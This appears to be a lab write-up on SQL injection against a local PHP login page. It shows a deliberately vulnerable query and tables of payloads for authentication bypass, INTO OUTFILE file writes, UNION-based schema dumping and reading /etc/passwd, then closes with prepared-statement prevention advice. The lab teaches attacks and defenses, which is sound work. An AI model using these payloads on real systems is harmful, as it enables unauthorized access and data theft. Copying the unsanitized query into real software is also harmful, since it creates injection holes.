# SQL Injection (SQLi) Lab – Exploiting and Bypassing Insecure Queries

## Objective  
Learn how to exploit SQL injection (SQLi) in a vulnerable web application to bypass authentication, extract data, and write output to a file. Understand how unsanitized inputs lead to full database compromise.

---

## Tools Used  
- Apache Web Server  
- PHP login form (`index.php`)  
- Firefox (localhost)  
- Terminal (vi editor, gedit)  
- Kali Linux / VMware

---

## Lab Setup & Navigation

```bash
cd /var/www
ls
cd sqlinjection/
ls
sudo vi index.php
```

Start/restart web server:
```bash
sudo service apache2 start
sudo service apache2 restart
```

Open the site in browser:
```
http://localhost/sqlinjection/index.php
```

---

## Vulnerable SQL Code (Inside `index.php`)
```php
$sql = "SELECT * FROM students WHERE uid = $_GET['uid']";
```

- This is vulnerable: directly inserting unsanitized user input.

If user inputs:
```
2019 OR 1=1
```
The query becomes:
```sql
SELECT * FROM students WHERE uid = 2019 OR 1=1;
```
- Returns all students (authentication bypassed).

---

## Manual SQL Injection Payloads

| Input                    | Purpose                        |
|-------------------------|--------------------------------|
| 2019 OR 1=1             | Return all rows (true query)   |
| `' OR '1'='1`           | Classic auth bypass            |
| `' OR 1=1 --`           | Bypass and comment rest        |
| `' OR '1'='1' --`       | Bypass with double quotes      |

---

## Login Bypass Scenarios

**If username is known but password is not:**  
- Input this in **Password** field:  
  ```
  ' OR '1'='1
  ```

**If neither username nor password is known:**  
- Input this in **Username** field:
  ```
  ' OR '1'='1'#
  ```

- This logs you in as the first user in the database.

---

## Writing Output to File (Advanced SQLi)

**Payload:**
```sql
' or '1'='1' into outfile '/tmp/sql.txt'#
```

Use in browser:
```
http://localhost/sqlinjection/index.php?uid=' or '1'='1' into outfile '/tmp/sql.txt'#
```

Check output:
```bash
cat /tmp/sql.txt
ls /tmp/
sudo gedit /tmp/sql.txt
```

⚠- Works only if MySQL has **FILE** privilege and permission to write to `/tmp`.

---

## Useful SQLi Payloads

| Payload                                                     | Purpose                           |
|-------------------------------------------------------------|-----------------------------------|
| `' OR 'a'='a`                                               | Always true                       |
| `' UNION SELECT null, version() --`                        | Show database version             |
| `' UNION SELECT null, user() --`                           | Show DB user                      |
| `' UNION SELECT table_name, null FROM information_schema.tables --` | Dump all table names     |
| `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --` | Dump column names   |
| `' AND 1=0 UNION SELECT null, load_file('/etc/passwd') --` | Attempt to read system file       |
| `' OR 1=1 LIMIT 1 OFFSET 1 --`                              | Pagination for second user        |

---

## Secure Coding – Prevention

### Use **prepared statements**:
```php
$stmt = $pdo->prepare("SELECT * FROM students WHERE uid = :uid");
$stmt->bindParam(':uid', $_GET['uid']);
$stmt->execute();
```

### Additional protection:
- Validate and sanitize input  
- Escape special characters  
- Disable error details on production  
- Use least-privileged database accounts

## Outcome 
![Image](https://github.com/user-attachments/assets/27b58cb4-53d5-4342-9d8b-2b159523ab04)

